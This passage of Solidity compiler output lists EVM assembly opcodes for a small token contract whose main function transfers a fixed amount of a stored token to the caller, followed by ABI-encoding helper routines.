											"end": 396,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "PUSH",
											"source": 1,
											"value": "1191C087"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "PUSH",
											"source": 1,
											"value": "FC0C546A"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 233,
											"end": 391,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 233,
											"end": 391,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 233,
											"end": 391,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 233,
											"end": 391,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 233,
											"end": 391,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 233,
											"end": 391,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 233,
											"end": 391,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 233,
											"end": 391,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 233,
											"end": 391,
											"name": "tag",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 233,
											"end": 391,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 275,
											"end": 291,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 294,
											"end": 304,
											"name": "CALLER",
											"source": 1
										},
										{
											"begin": 275,
											"end": 304,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 275,
											"end": 304,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 315,
											"end": 329,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 332,
											"end": 338,
											"name": "PUSH",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 315,
											"end": 338,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 315,
											"end": 338,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 351,
											"end": 356,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 351,
											"end": 356,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 356,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 351,
											"end": 356,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 356,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 351,
											"end": 356,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 351,
											"end": 356,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 356,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 351,
											"end": 356,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 351,
											"end": 356,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 351,
											"end": 365,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 351,
											"end": 365,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 351,
											"end": 365,
											"name": "PUSH",
											"source": 1,
											"value": "A9059CBB"
										},
										{
											"begin": 366,
											"end": 374,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 376,
											"end": 382,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 351,
											"end": 383,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 351,
											"end": 383,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 233,
											"end": 391,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 233,
											"end": 391,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 233,
											"end": 391,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "tag",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 127,
											"end": 145,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 127,
											"end": 145,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 144,
											"name": "tag",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 7,
											"end": 144,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 7,
											"end": 144,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 92,
											"end": 98,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 86,
											"end": 99,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 77,
											"end": 99,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 77,
											"end": 99,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 108,
											"end": 138,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 132,
											"end": 137,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 108,
											"end": 138,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "23"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "tag",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 67,
											"end": 144,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 150,
											"end": 428,
											"name": "tag",
											"source": 2,
											"value": "18"
										},
										{
											"begin": 150,
											"end": 428,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 150,
											"end": 428,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 266,
											"end": 268,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 254,
											"end": 263,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 245,
											"end": 252,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 241,
											"end": 264,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 237,
											"end": 269,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 234,
											"end": 236,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 234,
											"end": 236,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 234,
											"end": 236,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 282,
											"end": 283,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 279,
											"end": 280,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 272,
											"end": 284,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 234,
											"end": 236,
											"name": "tag",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 234,
											"end": 236,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 325,
											"end": 326,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 403,
											"end": 410,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 394,
											"end": 400,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 383,
											"end": 392,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 379,
											"end": 401,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 350,
											"end": 411,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "tag",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 340,
											"end": 411,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 340,
											"end": 411,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 296,
											"end": 421,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 434,
											"end": 552,
											"name": "tag",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 434,
											"end": 552,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 521,
											"end": 545,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 539,
											"end": 544,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 521,
											"end": 545,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 521,
											"end": 545,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 521,
											"end": 545,
											"name": "tag",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 521,
											"end": 545,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 516,
											"end": 519,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 509,
											"end": 546,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 499,
											"end": 552,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 499,
											"end": 552,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 499,
											"end": 552,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 558,
											"end": 713,
											"name": "tag",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 558,
											"end": 713,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 657,
											"end": 706,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 700,
											"end": 705,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 657,
											"end": 706,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 657,
											"end": 706,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 657,
											"end": 706,
											"name": "tag",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 657,
											"end": 706,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 652,
											"end": 655,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 645,
											"end": 707,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 635,
											"end": 713,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 635,
											"end": 713,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 635,
											"end": 713,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 719,
											"end": 837,
											"name": "tag",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 719,
											"end": 837,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 806,
											"end": 830,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 824,
											"end": 829,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 806,
											"end": 830,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 806,
											"end": 830,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 806,
											"end": 830,
											"name": "tag",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 806,
											"end": 830,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 801,
											"end": 804,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 794,
											"end": 831,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 784,
											"end": 837,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 784,
											"end": 837,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 784,
											"end": 837,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 843,
											"end": 1175,
											"name": "tag",
											"source": 2,
											"value": "13"
										},
										{
											"begin": 843,
											"end": 1175,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 843,
											"end": 1175,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1002,
											"end": 1004,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 991,
											"end": 1000,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 987,
											"end": 1005,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 979,
											"end": 1005,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 979,
											"end": 1005,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1015,
											"end": 1086,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 1083,
											"end": 1084,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1072,
											"end": 1081,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1068,
											"end": 1085,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1059,
											"end": 1065,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 1015,
											"end": 1086,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 1015,
											"end": 1086,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1015,
											"end": 1086,
											"name": "tag",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 1015,
											"end": 1086,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1096,
											"end": 1168,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "41"
										},
										{
											"begin": 1164,
											"end": 1166,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1153,
											"end": 1162,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1149,
											"end": 1167,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1140,
											"end": 1146,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1096,
											"end": 1168,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 1096,
											"end": 1168,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1096,
											"end": 1168,
											"name": "tag",
											"source": 2,
											"value": "41"
										},
										{
											"begin": 1096,
											"end": 1168,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 969,
											"end": 1175,
											"name": "SWAP4",
											"source": 2
										},
										{
											"begin": 969,
											"end": 1175,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 969,
											"end": 1175,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 969,
											"end": 1175,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 969,
											"end": 1175,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 969,
											"end": 1175,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1181,
											"end": 1427,
											"name": "tag",
											"source": 2,
											"value": "10"
										},
										{
											"begin": 1181,
											"end": 1427,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1181,
											"end": 1427,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1324,
											"end": 1326,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1313,
											"end": 1322,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1309,
											"end": 1327,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1301,
											"end": 1327,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1301,
											"end": 1327,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1337,
											"end": 1420,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "43"
										},
										{
											"begin": 1417,
											"end": 1418,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1406,
											"end": 1415,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1402,
											"end": 1419,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1393,
											"end": 1399,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1337,
											"end": 1420,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 1337,
											"end": 1420,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1337,
											"end": 1420,
											"name": "tag",
											"source": 2,
											"value": "43"
										},
										{
											"begin": 1337,
											"end": 1420,
											"name": "JUMPDEST",
											"source": 2
										},
										{
